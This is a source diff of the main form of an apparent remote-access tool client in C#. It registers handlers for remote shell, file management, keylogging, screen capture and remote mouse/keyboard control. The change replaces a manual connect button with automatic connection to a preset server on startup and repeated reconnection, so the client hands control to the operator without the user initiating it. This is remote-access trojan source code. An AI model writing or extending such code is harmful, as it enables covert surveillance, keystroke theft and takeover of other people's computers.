@@ -1,24 +1,18 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
-using System.Linq;
-using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Client.Handlers;
 using Client.Networking;
 using Client.Services;
-using Common.Networking;
-using Common.Utils;
 
 namespace Client
 {
-    public partial class MainClientForm: Form
+    public partial class MainClientForm : Form
     {
         private ClientConnection? _connection;
         private PacketHandler? _packetHandler;
+
         private SystemInfoHandler? _systemInfoHandler;
         private RemoteShellHandler? _remoteShellHandler;
         private FileManagerHandler? _fileManagerHandler;
@@ -28,7 +22,7 @@ namespace Client
         private KeyLoggerHandler? _keyLoggerHandler;
         private ScreenControlHandler? _screenControlHandler;
 
-		public MainClientForm()
+        public MainClientForm()
         {
             InitializeComponent();
         }
@@ -36,7 +30,10 @@ namespace Client
         protected override void OnLoad(EventArgs e)
         {
             base.OnLoad(e);
+            chkAutoReconnect.Checked = true;
+
             _connection = new ClientConnection();
+
             var sysService = new SystemInfoService();
             var remoteShellService = new RemoteShellService();
             var fileManagerService = new FileManagerService();
@@ -45,6 +42,7 @@ namespace Client
             var shutdownActionService = new ShutdownActionService();
             var keyLoggerService = new KeyLoggerService(_connection);
             var screenControlService = new ScreenControlService(_connection);
+
             _systemInfoHandler = new SystemInfoHandler(sysService, _connection);
             _remoteShellHandler = new RemoteShellHandler(remoteShellService, _connection);
             _fileManagerHandler = new FileManagerHandler(fileManagerService, _connection);
@@ -53,6 +51,7 @@ namespace Client
             _shutdownActionHandler = new ShutdownActionHandler(shutdownActionService, _connection);
             _keyLoggerHandler = new KeyLoggerHandler(keyLoggerService);
             _screenControlHandler = new ScreenControlHandler(screenControlService, _connection);
+
             _packetHandler = new PacketHandler(
                onSystemInfoRequest: req => _ = _systemInfoHandler!.HandleAsync(req),
                onRemoteShellRequest: sreq => _ = _remoteShellHandler!.HandleAsync(sreq),
@@ -67,66 +66,80 @@ namespace Client
                onScreenControlStop: scs => _ = _screenControlHandler!.HandleStopAsync(scs),
                onScreenControlMouseEvent: scm => _ = _screenControlHandler!.HandleMouseEventAsync(scm),
                onScreenControlKeyboardEvent: sck => _ = _screenControlHandler!.HandleKeyboardEventAsync(sck)
-           );
+            );
+
             _connection.OnLineReceived += line => _packetHandler.HandleLine(line);
+
             _connection.OnDisconnected += () =>
             {
-                if (InvokeRequired)
-                {
-                    BeginInvoke(new Action(UpdateUiDisconnected));
-                }
-                else
-                {
-                    UpdateUiDisconnected();
-                }
+                if (IsDisposed || Disposing) return;
+
+                if (InvokeRequired) BeginInvoke(new Action(UpdateUiDisconnected));
+                else UpdateUiDisconnected();
             };
+            _ = AutoConnectAsync();
         }
 
-        private async void btnConnect_Click(object sender, EventArgs e)
+        private async Task AutoConnectAsync()
         {
-            if (_connection == null) return;
+            if (_connection == null || IsDisposed || Disposing) return;
             try
             {
-                if (!_connection.IsConnected)
-                {
-                    AppendLog($"[{DateTime.Now:HH:mm:ss}] Connecting to {txtServerIp.Text}:{txtPort.Text}");
-                    await _connection.ConnectAsync(txtServerIp.Text, int.Parse(txtPort.Text));
-                    lblStatus.ForeColor = Color.Green;
-                    lblStatus.Text = $"Connected to {txtServerIp.Text}:{txtPort.Text}";
-                    btnConnect.Text = "Disconnect";
-                    AppendLog($"[{DateTime.Now:HH:mm:ss}] Connected");
-                }
-                else
-                {
-                    _connection.Dispose();
-                    lblStatus.ForeColor = Color.Red;
-                    lblStatus.Text = "Disconnected";
-                    btnConnect.Text = "Connect";
-                    AppendLog($"[{DateTime.Now:HH:mm:ss}] Disconnected");
-                }
+                if (_connection.IsConnected) return;
+
+                AppendLog($"[{DateTime.Now:HH:mm:ss}] Auto connecting to server...");
+                await _connection.ConnectAsync();
+                lblStatus.ForeColor = Color.Green;
+                lblStatus.Text = $"Connected to {_connection.RemoteHost}:{_connection.RemotePort}";
+                AppendLog($"[{DateTime.Now:HH:mm:ss}] Connected successfully.");
             }
             catch (Exception ex)
             {
-                AppendLog($"[{DateTime.Now:HH:mm:ss}] [ERROR] {ex.Message}");
+                if (!IsDisposed)
+                {
+                    AppendLog($"[{DateTime.Now:HH:mm:ss}] [ERROR] Connect failed: {ex.Message}");
+                    lblStatus.ForeColor = Color.Red;
+                    lblStatus.Text = "Connection Failed. Retrying in 5s...";
+                    if (chkAutoReconnect.Checked)
+                    {
+                        await Task.Delay(5000); 
+                        _ = AutoConnectAsync(); 
+                    }
+                }
             }
         }
 
         private void AppendLog(string line)
         {
+            if (IsDisposed || Disposing) return; 
+
             if (txtLog.InvokeRequired)
             {
                 txtLog.BeginInvoke(new Action(() => AppendLog(line)));
                 return;
             }
+
             txtLog.AppendText(line + Environment.NewLine);
         }
 
-        private void UpdateUiDisconnected()
+        private async void UpdateUiDisconnected()
         {
+            if (IsDisposed) return;
+
             lblStatus.ForeColor = Color.Red;
             lblStatus.Text = "Disconnected";
-            btnConnect.Text = "Connect"; 
             AppendLog($"[{DateTime.Now:HH:mm:ss}] Disconnected by server");
+            if (chkAutoReconnect.Checked)
+            {
+                AppendLog($"[{DateTime.Now:HH:mm:ss}] Waiting 3s before reconnecting...");
+                await Task.Delay(3000); 
+                _ = AutoConnectAsync();
+            }
+        }
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+            base.OnFormClosing(e);
+            _connection?.Dispose(); 
         }
     }
 }
